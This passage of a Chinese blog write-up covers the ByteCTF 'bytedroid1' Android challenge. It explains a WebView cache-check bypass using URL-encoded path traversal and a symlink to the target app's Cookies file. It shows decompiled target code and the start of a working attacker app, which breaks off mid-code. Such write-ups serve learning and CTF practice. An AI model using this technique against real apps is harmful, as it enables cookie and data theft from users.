class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.ByteDroid1&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid1.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid1.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="FlagRecevier"><a href="#FlagRecevier" class="headerlink" title="FlagRecevier"></a>FlagRecevier</h3><p>接收flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bytedroid1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.webkit.CookieManager;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag2</span> <span class="operator">=</span> Base64.encodeToString(flag.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="number">0</span>);</span><br><span class="line">                <span class="type">CookieManager</span> <span class="variable">cookieManager</span> <span class="operator">=</span> CookieManager.getInstance();</span><br><span class="line">                cookieManager.setCookie(<span class="string">&quot;https://tiktok.com/&quot;</span>, <span class="string">&quot;flag=&quot;</span> + flag2);</span><br><span class="line">                Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><blockquote><p>MainActivity 中先检查APP数据目录下&#x2F;cache文件夹下是否有index.html，如果没有则解压资源文件中的game.zip到cache目录实现WebView离线加载 ，然后就会接受getIntent().getData() 如果没拿到或者没通过host和scheme的校验则设置为指定的index.html </p><p>如果通过校验则被webview加载，然后被shouldInterceptRequest拦截到后再次验证，先是使用getPathSegments对路径进行分段，对第一段内容和最后一断后缀进行校验，如果通过则通过InputStream读取内容并且通过return new WebResourceResponse(null, “utf-8”, ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION, “OK”, headers, inputStream)返回，实现离线加载的效果。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bytedroid1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebResourceRequest;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebResourceResponse;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebViewClient;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.recyclerview.widget.ItemTouchHelper;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipInputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getCacheDir(), <span class="string">&quot;index.html&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                UnZipAssetsFolder(getApplicationContext(), <span class="string">&quot;game.zip&quot;</span>, getCacheDir().getPath());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span> || !data.getHost().endsWith(<span class="string">&quot;.toutiao.com&quot;</span>) || !data.getScheme().equals(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://bytectf.toutiao.com/local_cache/index.html&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123; <span class="comment">// from class: com.bytectf.bytedroid1.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">            <span class="keyword">public</span> WebResourceResponse <span class="title function_">shouldInterceptRequest</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">                <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> request.getUrl();</span><br><span class="line">                List&lt;String&gt; pathSegments = uri.getPathSegments();</span><br><span class="line">                <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> pathSegments.size();</span><br><span class="line">                <span class="keyword">if</span> (size &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">lastPathSegment</span> <span class="operator">=</span> pathSegments.get(size - <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (pathSegments.get(<span class="number">0</span>).equals(<span class="string">&quot;local_cache&quot;</span>) &amp;&amp; (lastPathSegment.endsWith(<span class="string">&quot;.html&quot;</span>) || lastPathSegment.endsWith(<span class="string">&quot;.js&quot;</span>) || lastPathSegment.endsWith(<span class="string">&quot;.css&quot;</span>) || lastPathSegment.endsWith(<span class="string">&quot;.png&quot;</span>))) &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">cacheFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(MainActivity.<span class="built_in">this</span>.getCacheDir(), MainActivity$<span class="number">1</span>$$ExternalSyntheticBackport0.m(File.separator, pathSegments.subList(<span class="number">1</span>, size)));</span><br><span class="line">                        <span class="keyword">if</span> (cacheFile.exists()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(cacheFile);</span><br><span class="line">                                Map&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                                headers.put(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebResourceResponse</span>(<span class="literal">null</span>, <span class="string">&quot;utf-8&quot;</span>, ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION, <span class="string">&quot;OK&quot;</span>, headers, inputStream);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.shouldInterceptRequest(view, request);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        webView.loadUrl(data.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">UnZipAssetsFolder</span><span class="params">(Context context, String zipFileString, String outPathString)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">inPutZip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(context.getAssets().open(zipFileString));</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">ZipEntry</span> <span class="variable">zipEntry</span> <span class="operator">=</span> inPutZip.getNextEntry();</span><br><span class="line">            <span class="keyword">if</span> (zipEntry != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">szName</span> <span class="operator">=</span> zipEntry.getName();</span><br><span class="line">                <span class="keyword">if</span> (zipEntry.isDirectory()) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">szName2</span> <span class="operator">=</span> szName.substring(<span class="number">0</span>, szName.length() - <span class="number">1</span>);</span><br><span class="line">                    <span class="type">File</span> <span class="variable">folder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outPathString + File.separator + szName2);</span><br><span class="line">                    <span class="keyword">if</span> (!folder.exists()) &#123;</span><br><span class="line">                        folder.mkdirs();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outPathString + File.separator + szName);</span><br><span class="line">                    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                        file.getParentFile().mkdirs();</span><br><span class="line">                        file.createNewFile();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">                    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> inPutZip.read(buffer);</span><br><span class="line">                        <span class="keyword">if</span> (len == -<span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                        out.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                inPutZip.close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心逻辑：</p><ul><li>拿到请求 URL：<code>Uri uri = request.getUrl();</code></li><li>取 pathSegments（把路径按 <code>/</code> 切开）：比如：<code>/local_cache/index.html</code> → <code>[&quot;local_cache&quot;,&quot;index.html&quot;]</code></li><li>检查：<ol><li>第一段必须是 <code>&quot;local_cache&quot;</code></li><li>最后一段文件名必须以 <code>.html/.js/.css/.png</code> 结尾</li></ol></li><li>如果满足，就去本地 cache 目录找对应文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">cacheFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(</span><br><span class="line">    MainActivity.<span class="built_in">this</span>.getCacheDir(),</span><br><span class="line">    join(File.separator, pathSegments.subList(<span class="number">1</span>, size))</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>若文件存在：返回一个 WebResourceResponse，把本地文件流当成响应体，并加上：Access-Control-Allow-Origin: *</p><p>效果：</p><p>只要页面里请求的路径长得像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.toutiao.com/local_cache/xxx.js</span><br><span class="line">http://bytectf.toutiao.com/local_cache/index.html</span><br></pre></td></tr></table></figure><p>WebView 实际拿到的内容会来自,&#x2F;data&#x2F;data&#x2F;com.bytectf.bytedroid1&#x2F;cache&#x2F;xxx.js 等文件,这就是一个伪装成网络域名，实际从本地 cache 提供资源的机制</p><p>此外这里还有个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView webView = new WebView(getApplicationContext());</span><br></pre></td></tr></table></figure><p>意思是：用全局 App 上下文”创建一个 WebView，而不是用当前 Activity 的上下文，此外还有以下的声明方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebView webView = new WebView(this);</span><br><span class="line">// 或</span><br><span class="line">WebView webView = findViewById(R.id.webview);</span><br></pre></td></tr></table></figure><h2 id="漏洞分析及实现"><a href="#漏洞分析及实现" class="headerlink" title="漏洞分析及实现"></a>漏洞分析及实现</h2><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>URLencode配合getPathSegments实现路径穿越</p><p>首先就要想到绕过第一层校验，让WebView实际加载恶意的html，可以通过路径穿越绕过，加载Attacker App内部存储的html文件。因为MainActivity中有一个List<String> pathSegments &#x3D; uri.getPathSegments(); 实际就是对路径进行切分，然后decode。如果不进行URL编码，那么路径穿越中间部分的..&#x2F; 都会在WebView进行加载时被去除，从而使得在shouldInterceptRequest 拦截到后的url中不含有返回上一级目录的url部分，从而失败，但是由于存在getPathSegments就可以先编码，然后解码之后成功实现路径穿越。</p><blockquote><p>严谨的来说不是直接去除..&#x2F;而是在 URL 规范化过程中，与它前面的一个 path segment 发生“抵消（pop）。</p></blockquote><p><code>Uri.getPathSegments()</code> 干了什么？</p><p>官方语义是：</p><blockquote><p><strong>Return the decoded path segments of this URI.</strong></p></blockquote><p>示例 1：普通路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(&quot;http://a.com/local_cache/a/b/c.html&quot;);</span><br><span class="line">uri.getPathSegments();</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;local_cache&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c.html&quot;]</span><br></pre></td></tr></table></figure><p>示例 2：未编码的 <code>../</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(&quot;http://a.com/local_cache/../evil.html&quot;);</span><br><span class="line">uri.getPathSegments();</span><br></pre></td></tr></table></figure><p> 在 <strong>WebView &#x2F; URL 解析阶段</strong>，<code>../</code> 很可能已经被<strong>规范化（normalize）</strong> 掉了：</p><p>等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.com/evil.html</span><br></pre></td></tr></table></figure><p>于是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;evil.html&quot;]</span><br></pre></td></tr></table></figure><p>这里..&#x2F;与local_cache发生了抵消</p><p>如果是<code>http://a.com/local_cache/../../../evil.html</code>仍旧只剩evil.html因为无法pop了</p><p>示例 3：URL 编码的路径穿越</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(</span><br><span class="line">  &quot;http://a.com/local_cache/%2e%2e/%2e%2e/evil.html&quot;</span><br><span class="line">);</span><br><span class="line">uri.getPathSegments();</span><br></pre></td></tr></table></figure><p><strong>执行流程非常关键：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/local_cache/%2e%2e/%2e%2e/evil.html</span><br></pre></td></tr></table></figure><ul><li>这一步 <strong>不会被 normalize</strong></li><li>因为 <code>%2e</code> ≠ <code>.</code></li></ul><p>当然如果是<code>http://bytectf.toutiao.com/local_cache/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fdata/data/com.bytectf.pwnbytedroid1/files/symlink.html</code>也行，也就是把<code>..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fdata</code>识别城一个路径了</p><blockquote><p>从而再次被拦截后路径穿越，访问到symlink.html ，它指向被攻击APP数据目录下&#x2F;app_webview&#x2F;Cookies文件，从而导致Cookies泄露并且将结果传送到远程。思路甚至比mediumdroid清晰</p></blockquote><h3 id="方案一实现"><a href="#方案一实现" class="headerlink" title="方案一实现"></a>方案一实现</h3><blockquote><p>LLeaves中提到<strong>由于FlagRecevier设置Cookies需要一段时间，所以最好延时40s后启动实际的攻击流程</strong>(如果是本地模拟的话广播完不用等待)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbytedroid1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.bytedroid1&quot;</span>,<span class="string">&quot;com.bytectf.bytedroid1.MainActivity&quot;</span>);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;http://bytectf.toutiao.com/local_cache/..%2F..%2F..%2F..%2F..%2Fdata/data/com.bytectf.pwnbytedroid1/files/evil.html&quot;</span>));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createSymlink();</span><br><span class="line">            createHTML();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep( <span class="number">40</span> * <span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createHTML</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dataDir</span> <span 